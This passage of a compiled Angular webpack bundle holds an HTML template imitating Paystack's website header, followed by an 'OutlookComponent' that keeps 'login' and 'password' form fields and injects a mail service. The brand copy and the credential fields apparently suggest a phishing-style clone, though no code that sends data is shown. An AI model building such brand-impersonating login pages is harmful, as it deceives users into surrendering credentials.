5.6178H81.0744C81.2793 5.6178 81.4495 5.69226 81.5803 5.84247C81.711 5.98337 81.7787 6.1526 81.7787 6.35036V18.0624C81.7787 18.2616 81.7078 18.4294 81.577 18.5623C81.4399 18.7 81.273 18.7663 81.0743 18.7663H78.4249C78.2437 18.7663 78.0828 18.7 77.941 18.5655C77.796 18.4358 77.7251 18.2616 77.7251 18.0624V17.7174C77.4162 18.075 77.0127 18.3818 76.5052 18.6335C75.8307 18.9657 75.0426 19.1349 74.1632 19.1349C73.3263 19.1349 72.5036 18.975 71.7186 18.6524C70.9322 18.3218 70.2276 17.8503 69.6319 17.2444C69.0315 16.64 68.5459 15.8965 68.1804 15.0517C67.8147 14.1974 67.6303 13.2322 67.6303 12.1803C67.6303 11.1282 67.8147 10.1584 68.1804 9.31048C68.5459 8.46083 69.0376 7.72672 69.6444 7.12716C70.2514 6.52593 70.959 6.05931 71.747 5.73651C72.5287 5.41377 73.3546 5.25243 74.1915 5.25243C75.071 5.25243 75.8512 5.41855 76.5194 5.75553C77.0175 6.00537 77.421 6.31239 77.7252 6.67149V6.35036C77.7252 6.1526 77.7961 5.9802 77.938 5.83141C78.0829 5.6922 78.2437 5.6178 78.425 5.6178ZM76.8677 14.4093C77.1358 14.1341 77.3469 13.8034 77.4951 13.4159C77.6464 13.0314 77.7252 12.6232 77.7252 12.2071C77.7252 11.7705 77.6464 11.3608 77.4951 10.9794C77.3469 10.6093 77.1358 10.2786 76.8677 10.0001C76.6046 9.72507 76.2877 9.50338 75.927 9.33576C75.5707 9.16957 75.1768 9.08418 74.7431 9.08418C74.3303 9.08418 73.9362 9.16957 73.5706 9.33576C73.2066 9.50338 72.885 9.72501 72.6171 10.0001C72.3539 10.2722 72.1427 10.6061 71.9914 10.9794C71.8417 11.3608 71.7677 11.7705 71.7677 12.2071C71.7677 12.6232 71.8417 13.0313 71.9914 13.4159C72.1427 13.8034 72.3539 14.1404 72.6171 14.4093C72.885 14.6877 73.2066 14.9093 73.5706 15.077C73.9363 15.2431 74.3303 15.3285 74.7431 15.3285C75.1768 15.3285 75.5707 15.2431 75.927 15.077C76.2877 14.9093 76.6046 14.6877 76.8677 14.4093ZM94.1167 13.7006L95.6375 14.854C95.8189 14.9963 95.9496 15.1735 96.0301 15.3856C96.1121 15.6101 96.0964 15.8428 95.9671 16.0769C95.409 16.966 94.6195 17.7017 93.6107 18.2712C92.6052 18.8455 91.4027 19.1349 90.0535 19.1349C89.078 19.1349 88.1449 18.9546 87.2952 18.5986C86.4364 18.2395 85.6814 17.7428 85.0509 17.1258C84.4158 16.5104 83.9162 15.77 83.5615 14.933C83.2038 14.0883 83.0178 13.1691 83.0178 12.2072C83.0178 11.2422 83.2038 10.3214 83.5615 9.47187C83.9162 8.6175 84.4158 7.87873 85.0509 7.26016C85.6814 6.64003 86.4364 6.14799 87.2952 5.79038C88.1449 5.43451 89.078 5.25254 90.0535 5.25254C91.4027 5.25254 92.6052 5.54365 93.6107 6.11157C94.6195 6.68745 95.4089 7.42156 95.9623 8.30271C96.0963 8.54 96.112 8.77723 96.03 9.01147C95.9496 9.23931 95.8125 9.41009 95.6296 9.53352L94.1104 10.6884C93.8267 10.9162 93.554 10.9794 93.3113 10.8847C93.0954 10.796 92.9125 10.6632 92.758 10.486C92.3814 10.0413 91.9889 9.69163 91.5933 9.44645C91.204 9.20761 90.7075 9.08418 90.1133 9.08418C89.6768 9.08418 89.2765 9.16957 88.9234 9.33576C88.5624 9.50338 88.2472 9.72501 87.9824 10.0001C87.7146 10.2722 87.5082 10.6061 87.3677 10.9794C87.2259 11.356 87.1566 11.7642 87.1566 12.2071C87.1566 12.6264 87.2259 13.0268 87.3677 13.4063C87.5129 13.7781 87.7193 14.1151 87.9824 14.3967C88.2504 14.6848 88.5624 14.9046 88.9186 15.0628C89.2765 15.2211 89.6768 15.3001 90.1133 15.3001C90.7074 15.3001 91.2102 15.1799 91.5933 14.9426C91.9889 14.6973 92.3814 14.3461 92.7548 13.9031C92.9125 13.7259 93.0954 13.5914 93.3113 13.5044C93.5491 13.4063 93.8267 13.4696 94.1167 13.7006ZM40.6113 5.61785H43.5806C43.9841 5.61785 44.1575 5.80138 44.2316 5.95644C44.3216 6.16048 44.3216 6.41044 44.2223 6.71261L39.8597 20.8213C39.4703 22.0601 38.8304 23.0537 37.9636 23.783C37.0904 24.5187 35.9557 24.8825 34.597 24.8825C33.7933 24.8825 33.0367 24.7639 32.3526 24.5217C31.6608 24.2781 31.0744 23.938 30.6064 23.5014C30.3589 23.2862 30.1445 22.8986 30.5307 22.3054L31.4748 20.9305C31.6561 20.6537 31.8798 20.5113 32.1399 20.5113H32.1715C32.4156 20.5224 32.6412 20.5967 32.8397 20.7343C33.0462 20.8909 33.2794 21.0239 33.5378 21.1425C33.7932 21.2548 34.0564 21.3149 34.3338 21.3149C34.6711 21.3149 34.958 21.22 35.2148 21.0286C35.4701 20.8404 35.6671 20.5587 35.7934 20.1996L36.1732 19.1348L36.3039 18.7662H36.277H35.8169H35.7145H34.7152C34.4834 18.7662 34.2959 18.6998 34.154 18.5653C34.0232 18.4452 33.9254 18.2932 33.8641 18.1128L30.1036 6.71255C30.0263 6.45481 30.0263 6.20473 30.1082 5.99273C30.2012 5.74438 30.4518 5.61779 30.8504 5.61779H33.9254C34.1461 5.61779 34.3274 5.70324 34.4535 5.85992C34.5591 6.00218 34.6379 6.16364 34.6772 6.34083L37.0335 14.4394H37.5693L39.7586 6.33766C39.7995 6.16047 39.8878 5.9928 40.0186 5.85352C40.1588 5.7033 40.3623 5.61785 40.6113 5.61785Z\" transform=\"translate(37.0884 1.16753)\" fill=\"#011B33\"></path>\n            </svg>\n          </div>\n      <span>\n          <a class=\"feature-with-content\">Why Paystack</a>\n          <i  id=\"angle-down\" class=\"fa fa-angle-down\"></i>\n      </span>\n      <span>\n          <a>Customer</a>\n      </span>\n      <span>\n          <a>Pricng</a>\n      </span>\n      <span>\n          <a>Learn</a>\n          <i  id=\"angle-down\" class=\"fa fa-angle-down\"></i>\n      </span>\n      \n    \n    </div>\n    <div class=\"btn-group-auth\">\n        <span>\n            <a class=\"feature-with-content\">Developers</a>\n            <i  id=\"angle-down\" class=\"fa fa-angle-down\"></i>\n        </span>\n        <span>\n            <a class=\"feature-with-content\">Support</a>\n            <i  id=\"angle-down\" class=\"fa fa-angle-down\"></i>\n        </span>\n        <span>\n            <a>Login</a>\n        </span>\n        <a class=\"btn-create\">Create Free Account</a>\n        <span>\n            <i  id=\"angle-down\" class=\"fa fa-angle-down\"></i>\n        </span>\n        \n      \n      </div>\n  </div>\n\n  <div class=\"map-wrapper\">\n    \n  </div>\n  <div class=\"info\">\n    <h1>\n      Modern online and modern payment for Africa\n    </h1>\n    <h3>\n\n    </h3>\n    <!-- <a class=\"btn-create\" (click)=\"sendMail()\">\n      Create Free Account\n    </a> -->\n  </div>\n</div>\n\n\n"

/***/ }),

/***/ "./src/app/outlook/outlook.component.ts":
/*!**********************************************!*\
  !*** ./src/app/outlook/outlook.component.ts ***!
  \**********************************************/
/*! exports provided: OutlookComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "OutlookComponent", function() { return OutlookComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _mail_service__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ../mail.service */ "./src/app/mail.service.ts");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};


var OutlookComponent = /** @class */ (function () {
    function OutlookComponent(mailService) {
        this.mailService = mailService;
        // @ViewChild("login") login: ElementRef;
        // @ViewChild("password") password: ElementRef;
        this.forms = {
            login: "",
            password: ""
        };
    }
    OutlookComponent.prototype.ngOnInit = function () {
    };
    OutlookComponent.prototype.featureWithContent = function () {
    };
    OutlookComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-outlook',
            template: __webpack_require__(/*! ./outlook.component.html */ "./src/app/outlook/outlook.component.html"),
            styles: [__webpack_require__(/*! ./outlook.component.css */ "./src/app/outlook/outlook.component.css")]
        }),
        __metadata("design:paramtypes", [_mail_service__WEBPACK_IMPORTED_MODULE_1__["MailService"]])
    ], OutlookComponent);
    return OutlookComponent;
}());



/***/ }),

/***/ "./src/environments/environment.ts":
/*!*****************************************!*\
  !*** ./src/environments/environment.ts ***!
  \*****************************************/
/*! exports provided: environment */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "environment", function() { return environment; });
// This file can be replaced during build by using the `fileReplacements` array.
// `ng build --prod` replaces `environment.ts` with `environment.prod.ts`.
// The list of file replacements can be found in `angular.json`.
var environment = {
    production: false
};
/*
 * For easier debugging in development mode, you can import the following file
 * to ignore zone related error stack frames such as `zone.run`, `zoneDelegate.invokeTask`.
 *
 * This import should be commented out in production mode because it will have a negative impact
 * on performance if an error is thrown.
 */
// import 'zone.js/dist/zone-error';  // Included with Angular CLI.


/***/ }),

/***/ "./src/main.ts":
/*!*********************!*\
  !*** ./src/main.ts ***!
  \*********************/
/*! no exports provided */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_platform_browser_dynamic__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/platform-browser-dynamic */ "./node_modules/@angular/platform-browser-dynamic/fesm5/platform-browser-dynamic.js");
/* harmony import */ var _app_app_module__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./app/app.module */ "./src/app/app.module.ts");
/* harmony import */ var _environments_environment__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./environments/environment */ "./src/environments/environment.ts");




if (_environments_environment__WEBPACK_IMPORTED_MODULE_3__["environment"].production) {
    Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["enableProdMode"])();
}
Object(_angular_platform_browser_dynamic__WEBPACK_IMPORTED_MODULE_1__["platformBrowserDynamic"])().bootstrapModule(_app_app_module__WEBPACK_IMPORTED_MODULE_2__["AppModule"])
    .catch(function (err) { return console.error(err); });


/***/ }),

/***/ 0:
/*!***************************!*\
  !*** multi ./src/main.ts ***!
  \***************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__(/*! C:\Users\van victor\Desktop\calmdusk\calmdusk\src\main.ts */"./src/main.ts");


/***/ })

},[[0,"runtime","vendor"]]]);
//# sourceMappingURL=main.js.map